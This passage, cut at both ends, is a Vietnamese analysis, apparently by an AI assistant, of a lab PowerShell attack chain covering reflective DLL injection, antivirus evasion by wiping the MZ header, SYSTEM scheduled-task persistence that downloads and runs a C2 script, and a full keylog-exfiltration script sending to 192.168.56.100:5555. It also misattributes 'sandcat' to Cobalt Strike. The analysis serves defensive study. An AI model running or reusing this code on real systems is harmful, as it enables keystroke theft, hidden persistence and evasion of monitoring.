Đây là **hàm trung tâm** — thực hiện toàn bộ quy trình reflective loading:

```powershell
1. Get-PEBasicInfo → thông tin cơ bản
2. Kiểm tra 32/64-bit match
3. VirtualAlloc (local) hoặc VirtualAllocEx (remote)
4. Copy PE headers vào memory
5. Get-PEDetailedInfo → thông tin chi tiết
6. Copy-Sections → copy từng section
7. Update-MemoryAddresses → base relocation
8. Import-DllImports → load DLL + resolve imports
9. Update-MemoryProtectionFlags → đổi protection
10. Nếu remote: WriteProcessMemory copy PE vào remote
11. Nếu DLL: gọi DllMain (entry point)
12. Nếu EXE: Update-ExeFunctions + CreateThread gọi main
13. Return @($PEInfo.PEHandle, $EffectivePEHandle)
```

### 10.3.15. `Get-MemoryProcAddress` — tìm hàm export

Duyệt `IMAGE_EXPORT_DIRECTORY` để tìm địa chỉ hàm export theo tên:

```powershell
for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++) {
    $Name = PtrToStringAnsi($PEHandle + $ExportTable.AddressOfNames[$i])
    if ($Name -ceq $FunctionName) {
        $FuncIndex = $ExportTable.AddressOfNameOrdinals[$i]
        $FuncOffset = $ExportTable.AddressOfFunctions[$FuncIndex]
        return $PEHandle + $FuncOffset
    }
}
```


### 10.3.16. `Main` — điều phối

```powershell
1. Nếu $ProcName được cung cấp → resolve thành $ProcId
2. OpenProcess($ProcId) → $RemoteProcHandle (nếu inject remote)
3. Chọn PEBytes64 hoặc PEBytes32 dựa trên arch
4. Invoke-PatchDll → patch $PoshCode vào DLL template
5. Zero 2 byte đầu (MZ header) → tránh signature detection
6. Invoke-MemoryLoadLibrary → load DLL
7. Nếu DLL local: gọi function export (WStringFunc/StringFunc/VoidFunc)
8. Nếu DLL remote: gọi VoidFunc qua CreateRemoteThread
9. Invoke-MemoryFreeLibrary hoặc VirtualFree → dọn dẹp
```

**Chi tiết quan trọng:**

```powershell
# Zero MZ header
$PEBytes[0] = 0
$PEBytes[1] = 0
```

→ **Xóa signature `MZ`** để tránh bị AV scan theo signature.

## 10.4. `EnumProcesses` — tìm process integrity cao

```PS1
function EnumProcesses(){
    Get-Process -IncludeUserName | Where-Object {
        $_.UserName -like "*\$env:USERNAME" -and
        $_.Name -ne "conhost" -and
        $_.Name -ne "ctfmon" -and
        $_.Name -ne "sandcat" -and
        $_.Id -ne $PID
    } | %{
        # Mở process
        $ProcHandle = OpenProcess(0x00001000, $false, $_.Id)
        # Mở token
        $hTokenHandle = 0
        OpenProcessToken($ProcHandle, 0x02000000, [ref]$hTokenHandle)
        # Lấy integrity level
        GetTokenInformation($hTokenHandle, 25, [IntPtr]::Zero, $Length, [ref]$Length)
        $TokenInformation = AllocHGlobal($Length)
        GetTokenInformation($hTokenHandle, 25, $TokenInformation, $Length, [ref]$Length)
        $pSid1 = ReadIntPtr($TokenInformation)
        $IntegrityLevel = ReadInt32(GetSidSubAuthority($pSid1, ...))
        if($IntegrityLevel -eq 12288){  # 0x3000 = High Integrity
            return [int]$_.Id
        }
    }
}
```


**Mục đích:** Tìm process cùng user nhưng **integrity level = High (12288 = 0x3000)**.

**Tại sao cần High Integrity?**

- Process user thường có integrity Medium (0x2000).
- Process High (admin) có thể chạy code với quyền cao hơn.
- Inject vào process High → leo thang đặc quyền từ Medium → High.

**Loại trừ:**

- `conhost` — console host (không ổn định).
- `ctfmon` — CTF loader (không ổn định).
- `sandcat` — C2 agent của Cobalt Strike / Brute Ratel — có thể là process của attacker, không inject vào.
- `$PID` — chính process hiện tại.

**Hàm `Inject`:**

```powershell
function Inject {
    Param([String]$PoshCode)
    $HighIntegrityUserOwnedProcess = @(EnumProcesses)
    Invoke-PSInject -ProcId $HighIntegrityUserOwnedProcess[0] -PoshCode $PoshCode
}
```

→ Tự động chọn process High Integrity đầu tiên để inject.

---

## 10.5. Luồng thực thi đầy đủ

```TXT
orchestrator.ps1
    │
    ▼
$tool = DownloadString('.../Invoke-PSInject.ps1')
Invoke-Expression $tool
    │
    ▼
Định nghĩa function Invoke-PSInject + helpers
    │
    ▼
Invoke-PSInject -ProcId $np.Id -PoshCode $StubB64
    │
    ├── Decode Base64 → $PoshCode (PowerShell code)
    │
    ├── Chọn PEBytes64 (nếu 64-bit)
    │
    ├── Invoke-PatchDll: patch "Invoke-Replace" → $PoshCode
    │
    ├── Zero MZ header
    │
    ├── Invoke-MemoryLoadLibrary:
    │   ├── VirtualAllocEx trong notepad.exe
    │   ├── Copy PE headers
    │   ├── Copy sections
    │   ├── Update relocations
    │   ├── Import DLLs
    │   ├── Update protection
    │   ├── WriteProcessMemory → copy PE vào notepad
    │   └── CreateRemoteThread → gọi DllMain
    │
    └── DLL chạy → VoidFunc → chạy $PoshCode
            │
            ▼
        Stub keylogger chạy trong notepad.exe
            │
            ▼
        IEX DownloadString('.../keylogger.ps1')
```

## 10.6. Tóm tắt toàn bộ kill chain (10 stage — HOÀN CHỈNH NHẤT)

```TXT
[Stage 0]   Invoice_October.hta
                │ VBScript → PowerShell an
                ▼
[Stage 0.5] powershell.exe → IEX DownloadString('.../loader.ps1')
                │
                ▼
[Stage 1]   loader.ps1 (downloader)
                │
                ▼
[Stage 1.5] stage1.ps1
                ├── UAC Bypass (ms-settings + ComputerDefaults.exe)
                └── IEX DownloadString('.../stage2.ps1')
                        │
                        ▼
[Stage 2]   stage2.ps1 (ANTI-FORENSIC)
                ├── Tat 3 PowerShell logging policies
                ├── Disable 4 event channels (gom Sysmon)
                ├── Kill other PowerShell
                ├── Clear 7 log (2 lan)
                └── Spawn PowerShell MOI → tai stage3.ps1
                        │
                        ▼
[Stage 3]   stage3.ps1 (REGISTRY STAGING + SELF-CLEANUP)
                ├── Base64 → ghi HKCU\Software\Classes\Discord\Payload
                ├── Verify → decode → IEX
                ├── XOA registry
                │       │
                │       ▼
                │   [Stage 4] wmi_setup.ps1 (WMI PERSISTENCE)
                │       ├── __EventFilter (NotepadTrigger)
                │       ├── CommandLineEventConsumer (powershell -Enc ...)
                │       └── __FilterToConsumerBinding
                │               │
                │               ▼
                │       [Moi lan user mo Notepad]
                │               │
                │               ▼
                │       [Stage 5] orchestrator.ps1 (PAYLOAD CUOI)
                │               ├── [1] RevShell → Win32_Process.Create
                │               │       │
                │               │       ▼
                │               │   [Stage 6] revshell.ps1
                │               │       ├── while ($true):
                │               │       │   ├── TcpClient::new('192.168.56.100', 4444)
                │               │       │   ├── iex $data → thuc thi lenh
                │               │       │   └── gui output ve C2
                │               │       └── retry 30s
                │               │
                │               ├── [2] Tai Invoke-PSInject.ps1
                │               │       │
                │               │       ▼
                │               │   [Stage 7] Invoke-PSInject.ps1  ← FILE NAY
                │               │       ├── Decode Base64 PoshCode
                │               │       ├── Patch "Invoke-Replace" → PoshCode
                │               │       ├── Zero MZ header
                │               │       ├── Invoke-MemoryLoadLibrary
                │               │       │   ├── VirtualAllocEx
                │               │       │   ├── Copy sections
                │               │       │   ├── Update relocations
                │               │       │   ├── Import DLLs
                │               │       │   ├── Update protection
                │               │       │   └── CreateRemoteThread
                │               │       └── DLL chay → VoidFunc → PoshCode
                │               │
                │               ├── [3] Build stub keylogger (Base64)
                │               ├── [4] Inject stub vao Notepad (qua Invoke-PSInject)
                │               │       │
                │               │       ▼
                │               │   [Stage 8] keylogger.ps1
                │               │       ├── Log: C:\Users\Public\System32\kernel32.dll
                │               │       ├── GetAsyncKeyState polling 30ms
                │               │       ├── Xu ly Shift/CapsLock DUNG
                │               │       ├── Day du dau cau
                │               │       └── Rotating log > 10MB
                │               │
                │               ├── [5] Clear PowerShell log
                │               └── [6] Scheduled Task "SysLogMaint"
                │
                └── Clear 4 log
```

# 11. Register-ScheduledTask

<details>
<summary>Bấm vào đây để xem nội dung</summary>


```ps1
Register-ScheduledTask -TaskName "LoginTask" -Force -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument '-NoP -W H -Exec Bypass -C "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.WebRequest]::DefaultWebProxy=$null;$wc=New-Object Net.WebClient;$wc.Proxy=$null;IEX $wc.DownloadString(''https://192.168.56.100:8443/login_handler.ps1'')"') -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Principal (New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest)
```

</details>

<br>


Phân tích lệnh `Register-ScheduledTask` — Persistence qua Scheduled Task

Đây là **kỹ thuật persistence thứ 2** (sau WMI persistence ở stage 4) — dùng **Scheduled Task** để đảm bảo payload chạy lại mỗi lần user logon. Đây là **T1053.005 (Scheduled Task/Job: Scheduled Task)** — một trong những persistence phổ biến nhất của APT.

---

## 11.1. Phân tích câu lệnh

```powershell
Register-ScheduledTask -TaskName "LoginTask" -Force -Action (
    New-ScheduledTaskAction -Execute "powershell.exe" -Argument '-NoP -W H -Exec Bypass -C "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.WebRequest]::DefaultWebProxy=$null;$wc=New-Object Net.WebClient;$wc.Proxy=$null;IEX $wc.DownloadString(''https://192.168.56.100:8443/login_handler.ps1'')"'
) -Trigger (
    New-ScheduledTaskTrigger -AtLogOn
) -Principal (
    New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
)
```


### 11.1.1. Cấu trúc

| Thành phần | Giá trị | Ý nghĩa |
|---|---|---|
| `TaskName` | `"LoginTask"` | **Tên task** — ngụy trang thành task login hợp lệ |
| `-Force` | — | **Ghi đè** nếu task đã tồn tại (idempotent) |
| `-Action` | `powershell.exe ...` | **Hành động** — chạy PowerShell downloader |
| `-Trigger` | `-AtLogOn` | **Trigger** — chạy mỗi khi user logon |
| `-Principal` | `UserId "SYSTEM"`, `RunLevel Highest` | Chạy với **quyền SYSTEM** |

### 11.1.2. Action — PowerShell downloader

```powershell
powershell.exe -NoP -W H -Exec Bypass -C "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.WebRequest]::DefaultWebProxy=$null;$wc=New-Object Net.WebClient;$wc.Proxy=$null;IEX $wc.DownloadString('https://192.168.56.100:8443/login_handler.ps1')"
```

**Cùng bộ bypass quen thuộc** như các stage trước:

- `-NoP` — không load profile.
- `-W H` — ẩn cửa sổ.
- `-Exec Bypass` — bỏ qua ExecutionPolicy.
- `-C` — chạy lệnh trực tiếp.
- **Tắt TLS validation** — chấp nhận cert tự ký.
- **Tắt proxy** — kết nối trực tiếp tới C2.
- `IEX DownloadString` — tải `login_handler.ps1` và chạy fileless.

**URL mới:** `https://192.168.56.100:8443/login_handler.ps1` — stage tiếp theo (chưa thấy).


### 11.1.3. Trigger — `AtLogOn`

```powershell
New-ScheduledTaskTrigger -AtLogOn
```

- **Chạy mỗi khi user logon** vào máy.
- **Không cần user mở Notepad** (khác WMI persistence).
- **Chạy ngay khi máy khởi động + user login** → đảm bảo payload active sớm.

**So sánh với WMI persistence (stage 4):**

| Tiêu chí | WMI `NotepadTrigger` | Scheduled Task `LoginTask` |
|---|---|---|
| Trigger | User mở Notepad | User logon |
| Tần suất | Mỗi lần mở Notepad | Mỗi lần logon (1 lần/phiên) |
| Quyền | SYSTEM (qua WmiPrvSE) | SYSTEM (trực tiếp) |
| Phát hiện | Khó (WMI repo) | Dễ hơn (`schtasks /query`) |
| Self-healing | Mỗi lần mở Notepad | Mỗi lần logon |

→ **Scheduled Task dễ phát hiện hơn WMI** (vì `schtasks` là tool phổ biến), nhưng **ổn định hơn** (không phụ thuộc user mở app cụ thể).

### 11.1.4. Principal — SYSTEM + Highest

```powershell
New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
```

- `UserId "SYSTEM"` — chạy dưới tài khoản `NT AUTHORITY\SYSTEM` (quyền cao nhất trên máy local).
- `RunLevel Highest` — chạy với quyền tối đa (không bị giới hạn bởi UAC).

**Tại sao SYSTEM?**


- **Không cần user đăng nhập** — task chạy dù user nào logon.
- **Toàn quyền** — có thể đọc/ghi mọi file, registry, process.
- **Không bị UAC** — không cần bypass.
- **Khó bị kill** — task do SYSTEM tạo, user thường không thể xóa.

---

## 11.2. Vị trí trong kill chain

Đây là **persistence thứ 2** — sau khi attacker đã có **SYSTEM revshell**:

```text
[Stage 5] orchestrator.ps1 (SYSTEM, từ WMI persistence)
    |
    ├── [1] RevShell → SYSTEM shell
    |
    ├── [2] Inject keylogger vào Notepad
    |
    ├── [5] Clear PowerShell log
    |
    └── [6] Scheduled Task "SysLogMaint" (anti-forensic)
            |
            ▼
    [Attacker có SYSTEM revshell]
            |
            ▼
    [Chạy lệnh Register-ScheduledTask "LoginTask"] ← LỆNH NÀY
            |
            ▼
    [Stage mới] login_handler.ps1
            |
            ▼
    (Payload cuối — có thể là RAT, ransomware, lateral movement...)
```

**Điểm quan trọng:** Lệnh này được chạy **thủ công bởi attacker qua revshell** — không phải tự động từ orchestrator. Điều này cho thấy:

- Attacker đang **tương tác trực tiếp** với máy nạn nhân.
- Đây là **bước tiến hóa** — attacker cài thêm persistence sau khi đã có shell.
- Có thể là **red team đang test** hoặc **attacker thật đang mở rộng quyền kiểm soát**.

---

## 11.3. Tại sao dùng Scheduled Task thay vì chỉ WMI?

Attacker **không dựa vào một persistence duy nhất** — đây là **defense in depth (nhiều lớp)**:

| Lớp persistence | Cơ chế | Ưu điểm | Nhược điểm |
|---|---|---|---|
| **WMI `NotepadTrigger`** | User mở Notepad | Khó phát hiện | Phụ thuộc user mở app |
| **Scheduled Task `LoginTask`** | User logon | Ổn định, chạy sớm | Dễ phát hiện hơn |
| **Scheduled Task `SysLogMaint`** | 1 phút sau khi tạo | Anti-forensic | Tự xóa |

→ Nếu một lớp bị diệt, lớp khác vẫn hoạt động. Đây là **chiến lược persistence đa tầng của APT**.

## 11.4. Tóm tắt toàn bộ kill chain (11 stage — HOÀN CHỈNH NHẤT)

```txt
[Stage 0]   Invoice_October.hta
                │ VBScript → PowerShell an
                ▼
[Stage 0.5] powershell.exe → IEX DownloadString('.../loader.ps1')
                │
                ▼
[Stage 1]   loader.ps1 (downloader)
                │
                ▼
[Stage 1.5] stage1.ps1
                ├── UAC Bypass (ms-settings + ComputerDefaults.exe)
                └── IEX DownloadString('.../stage2.ps1')
                        │
                        ▼
[Stage 2]   stage2.ps1 (ANTI-FORENSIC)
                ├── Tat 3 PowerShell logging policies
                ├── Disable 4 event channels (gom Sysmon)
                ├── Kill other PowerShell
                ├── Clear 7 log (2 lan)
                └── Spawn PowerShell MOI → tai stage3.ps1
                        │
                        ▼
[Stage 3]   stage3.ps1 (REGISTRY STAGING + SELF-CLEANUP)
                ├── Base64 → ghi HKCU\Software\Classes\Discord\Payload
                ├── Verify → decode → IEX
                ├── XOA registry
                │       │
                │       ▼
                │   [Stage 4] wmi_setup.ps1 (WMI PERSISTENCE)
                │       ├── __EventFilter (NotepadTrigger)
                │       ├── CommandLineEventConsumer (powershell -Enc ...)
                │       └── __FilterToConsumerBinding
                │               │
                │               ▼
                │       [Moi lan user mo Notepad]
                │               │
                │               ▼
                │       [Stage 5] orchestrator.ps1 (PAYLOAD CUOI)
                │               ├── [1] RevShell → Win32_Process.Create
                │               │       │
                │               │       ▼
                │               │   [Stage 6] revshell.ps1
                │               │       ├── while ($true):
                │               │       │   ├── TcpClient::new('192.168.56.100', 4444)
                │               │       │   ├── iex $data → thuc thi lenh
                │               │       │   └── gui output ve C2
                │               │       └── retry 30s
                │               │
                │               ├── [2] Tai Invoke-PSInject.ps1
                │               │       │
                │               │       ▼
                │               │   [Stage 7] Invoke-PSInject.ps1
                │               │       ├── Decode Base64 PoshCode
                │               │       ├── Patch "Invoke-Replace" → PoshCode
                │               │       ├── Zero MZ header
                │               │       ├── Invoke-MemoryLoadLibrary
                │               │       │   ├── VirtualAllocEx
                │               │       │   ├── Copy sections
                │               │       │   ├── Update relocations
                │               │       │   ├── Import DLLs
                │               │       │   ├── Update protection
                │               │       │   └── CreateRemoteThread
                │               │       └── DLL chay → VoidFunc → PoshCode
                │               │
                │               ├── [3] Build stub keylogger (Base64)
                │               ├── [4] Inject stub vao Notepad (qua Invoke-PSInject)
                │               │       │
                │               │       ▼
                │               │   [Stage 8] keylogger.ps1
                │               │       ├── Log: C:\Users\Public\System32\kernel32.dll
                │               │       ├── GetAsyncKeyState polling 30ms
                │               │       ├── Xu ly Shift/CapsLock DUNG
                │               │       ├── Day du dau cau
                │               │       └── Rotating log > 10MB
                │               │
                │               ├── [5] Clear PowerShell log
                │               └── [6] Scheduled Task "SysLogMaint" (anti-forensic)
                │
                ▼
[Attacker có SYSTEM revshell]
                │
                ▼
[Stage 9]   Register-ScheduledTask "LoginTask"  ← LENH NAY
                ├── TaskName: LoginTask
                ├── Action: powershell.exe -NoP -W H -Exec Bypass -C "..."
                ├── Trigger: AtLogOn
                ├── Principal: SYSTEM, Highest
                │       │
                │       ▼
                │   [Moi lan user logon]
                │       │
                │       ▼
                │   [Stage 10] login_handler.ps1
                │       └── (RAT / ransomware / lateral movement / exfil...)
                │
                └── (Persistence song song voi WMI NotepadTrigger)
```

# 12. login_handler.ps1

<details>
<summary>Bấm vào đây để xem nội dung</summary>


```ps1
function Invoke-KeyExfil {
    $PublicDir = "C:\Users\Public\System32"
    $KeyLogFile = "$PublicDir\kernel32.dll"
    $KaliIP = "192.168.56.100"
    $KaliPort = 5555

    if (-not (Test-Path $KeyLogFile)) {
        return
    }

    $keylog = Get-Content $KeyLogFile -Raw -EA SilentlyContinue
    if ([string]::IsNullOrEmpty($keylog)) {
        return
    }

    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $client.Connect($KaliIP, $KaliPort)

        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true

        $writer.WriteLine("=== KEYLOG UPLOAD ===")
        $writer.WriteLine("Host: $env:COMPUTERNAME")
        $writer.WriteLine("User: $([Security.Principal.WindowsIdentity]::GetCurrent().Name)")
        $writer.WriteLine("Time: $(Get-Date)")
        $writer.WriteLine("Size: $($keylog.Length) chars")
        $writer.WriteLine("--- BEGIN KEYLOG ---")
        $writer.Write($keylog)
        $writer.WriteLine("")
        $writer.WriteLine("--- END KEYLOG ---")

        $writer.Close()
        $stream.Close()
        $client.Close()
        $exfilOK = $true
    } catch {}

    if ($exfilOK) {
        Remove-Item $KeyLogFile -Force -EA SilentlyContinue
    }

}

Invoke-KeyExfil
```

</details>

<br>


Phân tích `login_handler.ps1` — Keylog Exfiltration qua TCP:

Đây là **stage 10** — payload cuối trong chuỗi mà bạn cung cấp. Nó **không phải RAT hay ransomware** như tôi dự đoán, mà là **module exfiltration** — gửi keylog đã thu thập về C2 qua TCP port 5555.

Đây là bước cuối cùng của chuỗi tấn công: **thu thập credential → exfil về attacker**.

---

## 12.1. Tổng quan

```text
login_handler.ps1
└── Invoke-KeyExfil
    ├── Đọc keylog từ C:\Users\Public\System32\kernel32.dll
    ├── Kiểm tra file tồn tại + không rỗng
    ├── Kết nối TCP tới 192.168.56.100:5555
    ├── Gửi header (hostname, user, time, size)
    ├── Gửi nội dung keylog
    ├── Đóng kết nối
    └── Nếu thành công → xóa file keylog (anti-forensic)
```

**Kích thước:** rất nhỏ (~40 dòng) — đủ để chạy nhanh, ít bị phát hiện.

**Chạy khi nào:** mỗi lần user logon (từ Scheduled Task `LoginTask`) → exfil keylog mỗi lần đăng nhập.

---

## 12.2. Phân tích từng phần

### 12.2.1. Cấu hình

```powershell
$PublicDir  = "C:\Users\Public\System32"
$KeyLogFile = "$PublicDir\kernel32.dll"
$KaliIP     = "192.168.56.100"
$KaliPort   = 5555
```

| Biến | Giá trị | Ý nghĩa |
|---|---|---|
| `$PublicDir` | `C:\Users\Public\System32` | Thư mục chứa keylog (từ `keylogger.ps1`) |
| `$KeyLogFile` | `kernel32.dll` | File keylog (masquerading) |
| `$KaliIP` | `192.168.56.100` | **C2 IP** — cùng IP với các stage trước |
| `$KaliPort` | `5555` | **Port mới** — khác 4444 (revshell) và 8443 (HTTPS) |

**Điểm đáng chú ý:**

1. **Tên biến `$KaliIP`** — attacker gọi thẳng tên "Kali" (Kali Linux) → đây là máy attacker chạy Kali Linux. Đây là **dấu hiệu red team/lab rõ ràng** (APT thật không dùng tên "Kali").

2. **Port 5555** — port phổ biến cho **reverse shell** (Metasploit `multi/handler` thường dùng 4444, 5555). Đây là port thứ 3 trong chuỗi:
   - `4444` — revshell (stage 6).
   - `8443` — HTTPS C2 (loader).
   - `5555` — exfil keylog (stage 10).

3. **Cùng IP** — attacker không đổi hạ tầng → điểm yếu opsec (dễ block toàn bộ IP).

### 12.2.2. Kiểm tra file keylog


```powershell
if (-not (Test-Path $KeyLogFile)) {
    return
}

$keylog = Get-Content $KeyLogFile -Raw -EA SilentlyContinue
if ([string]::IsNullOrEmpty($keylog)) {
    return
}
```

- Nếu file **không tồn tại** → thoát im lặng.
- Nếu file **rỗng** → thoát im lặng.
- `-Raw` — đọc toàn bộ file thành **1 string** (không phải array of lines) → giữ nguyên newline.
- `-EA SilentlyContinue` — không báo lỗi nếu file bị lock.

**Mục đích:**

- **Tránh lỗi** khi keylogger chưa chạy hoặc chưa ghi gì.
- **Idempotent** — có thể chạy nhiều lần mà không gây lỗi.
- **Silent fail** — không sinh event log nếu không có gì để gửi.

### 12.2.3. Kết nối TCP tới C2

```powershell
try {
    $client = New-Object System.Net.Sockets.TcpClient
    $client.Connect($KaliIP, $KaliPort)

    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true
    ...
} catch {}
```

**Phân tích:**


| Thành phần | Ý nghĩa |
|---|---|
| `New-Object System.Net.Sockets.TcpClient` | Tạo TCP client |
| `$client.Connect($KaliIP, $KaliPort)` | Kết nối tới C2:5555 |
| `$client.GetStream()` | Lấy NetworkStream |
| `New-Object System.IO.StreamWriter($stream)` | Tạo writer để ghi text |
| `$writer.AutoFlush = $true` | **Tự động flush** sau mỗi lần ghi → đảm bảo dữ liệu gửi ngay |
| `catch {}` | **Nuốt mọi lỗi** — nếu C2 không listen, không sinh event |

**So sánh với `revshell.ps1`:**

| Điểm | `revshell.ps1` | `login_handler.ps1` |
|---|---|---|
| Kết nối | `TcpClient::new(...)` (constructor trực tiếp) | `New-Object TcpClient` + `.Connect()` |
| Retry | `while ($true)` + retry 30s | **Không retry** — chạy 1 lần rồi thôi |
| Mục đích | Shell tương tác | **Gửi dữ liệu 1 chiều** |
| Error handling | `try/catch` + retry | `try/catch {}` — nuốt lỗi hoàn toàn |

#### Tại sao không retry?

- Đây là **exfil 1 lần** — nếu fail, lần logon sau sẽ thử lại.
- **Không cần persistent connection** — chỉ cần gửi data.
- **Giảm dấu vết** — không có process sống lâu chờ kết nối.


### 12.2.4. Gửi header

```powershell
$writer.WriteLine("=== KEYLOG UPLOAD ===")
$writer.WriteLine("Host: $env:COMPUTERNAME")
$writer.WriteLine("User: $([Security.Principal.WindowsIdentity]::GetCurrent().Name)")
$writer.WriteLine("Time: $(Get-Date)")
$writer.WriteLine("Size: $($keylog.Length) chars")
$writer.WriteLine("--- BEGIN KEYLOG ---")
```

**Header bao gồm:**

| Trường | Giá trị | Mục đích |
|---|---|---|
| `=== KEYLOG UPLOAD ===` | Marker | Attacker dễ parse |
| `Host: $env:COMPUTERNAME` | Tên máy | **Phân biệt nạn nhân** khi có nhiều máy |
| `User: ...WindowsIdentity...` | Tên user | **Biết ai bị nhiễm** |
| `Time: $(Get-Date)` | Thời gian | **Timestamp** |
| `Size: ... chars` | Kích thước keylog | **Kiểm tra toàn vẹn** |
| `--- BEGIN KEYLOG ---` | Marker | Phân tách header/data |

**Điểm đáng chú ý:**

1. `$env:COMPUTERNAME` — tên máy nạn nhân. Nếu attacker tấn công nhiều máy, đây là cách phân biệt.

2. `WindowsIdentity::GetCurrent().Name` — tên user đầy đủ (domain\user). Quan trọng nếu máy join domain — attacker biết domain account nào bị nhiễm.

3. `Get-Date` — timestamp. Attacker có thể sắp xếp keylog theo thời gian.

4. `Size` — kích thước. Attacker có thể verify dữ liệu nhận được.

**Format:** giống log format của tool legit → nếu ai đó chặn được traffic, có thể nhầm là log bình thường.


### 12.2.5. Gửi nội dung keylog

```powershell
$writer.Write($keylog)
$writer.WriteLine("")
$writer.WriteLine("--- END KEYLOG ---")
```

- `$writer.Write($keylog)` — ghi **toàn bộ nội dung keylog** (không thêm newline).
- `$writer.WriteLine("")` — thêm **1 dòng trống** (nếu keylog không kết thúc bằng newline).
- `$writer.WriteLine("--- END KEYLOG ---")` — marker kết thúc.

**Tại sao dùng `Write` thay vì `WriteLine`?**

- Keylog có thể chứa nhiều dòng (mỗi lần Enter = 1 dòng).
- `Write` **ghi nguyên văn** — không thêm newline.
- `WriteLine` sẽ thêm newline → làm hỏng format keylog.

### 12.2.6. Đóng kết nối + xóa keylog

```powershell
$writer.Close()
$stream.Close()
$client.Close()
$exfilOK = $true
} catch {}

if ($exfilOK) {
    Remove-Item $KeyLogFile -Force -EA SilentlyContinue
}
```

**Phân tích:**


1. **Đóng writer, stream, client** — theo thứ tự (writer → stream → client).
2. `$exfilOK = $true` — chỉ set khi **không có exception**.
3. `catch {}` — nuốt mọi lỗi. Nếu fail, `$exfilOK` vẫn là `$null` (falsy).
4. `if ($exfilOK)` — chỉ xóa keylog nếu gửi thành công.

#### Tại sao xóa keylog sau khi gửi?

| Lý do | Phân tích |
|---|---|
| **Anti-forensic** | Không để lại artifact trên đĩa |
| **Tránh phát hiện** | File `kernel32.dll` trong `C:\Users\Public\System32\` là IOC rõ ràng |
| **Tránh gửi trùng** | Lần logon sau không gửi lại dữ liệu cũ |
| **Giảm kích thước** | File không phình to (dù có rotating log) |

**Điểm yếu opsec:**

- Nếu gửi fail (C2 die), keylog vẫn còn → lần logon sau gửi lại → tốt cho attacker (không mất data).
- Nhưng nếu gửi thành công, keylog bị xóa → blue team không có artifact để điều tra.

**`$exfilOK` không được khởi tạo trước `try`:**

- Nếu `try` fail ngay từ đầu → `$exfilOK` là `$null` (falsy) → không xóa.
- Nếu `try` thành công → `$exfilOK = $true` → xóa.
- **Đây là logic đúng** — chỉ xóa khi chắc chắn đã gửi.


## 12.3. Luồng hoạt động

```txt
[Stage 9] Scheduled Task "LoginTask" (mỗi lần user logon)
    │
    ▼
powershell.exe -NoP -W H -Exec Bypass -C "IEX DownloadString('.../login_handler.ps1')"
    │
    ▼
login_handler.ps1
    │
    ├── Kiểm tra C:\Users\Public\System32\kernel32.dll tồn tại?
    │       ├── Không → return
    │       └── Có → đọc nội dung
    │
    ├── Kiểm tra rỗng?
    │       ├── Rỗng → return
    │       └── Không → tiếp tục
    │
    ├── Kết nối TCP tới 192.168.56.100:5555
    │       ├── Fail → catch {} → không xóa keylog (lần sau gửi lại)
    │       └── Success:
    │               ├── Gửi header (host, user, time, size)
    │               ├── Gửi keylog
    │               ├── Gửi footer
    │               ├── Đóng kết nối
    │               └── XÓA keylog
    │
    └── Kết thúc (không retry, không persist)
```

## 12.4. Tóm tắt toàn bộ kill chain (11 stage — HOÀN CHỈNH NHẤT)

```txt
[Stage 0]   Invoice_October.hta
                │ VBScript → PowerShell an
                ▼
[Stage 0.5] powershell.exe → IEX DownloadString('.../loader.ps1')
                │
                ▼
[Stage 1]   loader.ps1 (downloader)
                │
                ▼
[Stage 1.5] stage1.ps1
                ├── UAC Bypass (ms-settings + ComputerDefaults.exe)
                └── IEX DownloadString('.../stage2.ps1')
                        │
                        ▼
[Stage 2]   stage2.ps1 (ANTI-FORENSIC)
                ├── Tat 3 PowerShell logging policies
                ├── Disable 4 event channels (gom Sysmon)
                ├── Kill other PowerShell
                ├── Clear 7 log (2 lan)
                └── Spawn PowerShell MOI → tai stage3.ps1
                        │
                        ▼
[Stage 3]   stage3.ps1 (REGISTRY STAGING + SELF-CLEANUP)
                ├── Base64 → ghi HKCU\Software\Classes\Discord\Payload
                ├── Verify → decode → IEX
                ├── XOA registry
                │       │
                │       ▼
                │   [Stage 4] wmi_setup.ps1 (WMI PERSISTENCE)
                │       ├── __EventFilter (NotepadTrigger)
                │       ├── CommandLineEventConsumer (powershell -Enc ...)
                │       └── __FilterToConsumerBinding
                │               │
                │               ▼
                │       [Moi lan user mo Notepad]
                │               │
                │               ▼
                │       [Stage 5] orchestrator.ps1 (PAYLOAD CUOI)
                │               ├── [1] RevShell → Win32_Process.Create
                │               │       │
                │               │       ▼
                │               │   [Stage 6] revshell.ps1
                │               │       ├── while ($true):
                │               │       │   ├── TcpClient::new('192.168.56.100', 4444)
                │               │       │   ├── iex $data → thuc thi lenh
                │               │       │   └── gui output ve C2
                │               │       └── retry 30s
                │               │
                │               ├── [2] Tai Invoke-PSInject.ps1
                │               │       │
                │               │       ▼
                │               │   [Stage 7] Invoke-PSInject.ps1
                │               │       ├── Decode Base64 PoshCode
                │               │       ├── Patch "Invoke-Replace" → PoshCode
                │               │       ├── Zero MZ header
                │               │       ├── Invoke-MemoryLoadLibrary
                │               │       │   ├── VirtualAllocEx
                │               │       │   ├── Copy sections
                │               │       │   ├── Update relocations
                │               │       │   ├── Import DLLs
                │               │       │   ├── Update protection
                │               │       │   └── CreateRemoteThread
                │               │       └── DLL chay → VoidFunc → PoshCode
                │               │
                │               ├── [3] Build stub keylogger (Base64)
                │               ├── [4] Inject stub vao Notepad (qua Invoke-PSInject)
                │               │       │
                │               │       ▼
                │               │   [Stage 8] keylogger.ps1
                │               │       ├── Log: C:\Users\Public\System32\kernel32.dll
                │               │       ├── GetAsyncKeyState polling 30ms
                │               │       ├── Xu ly Shift/CapsLock DUNG
                │               │       ├── Day du dau cau
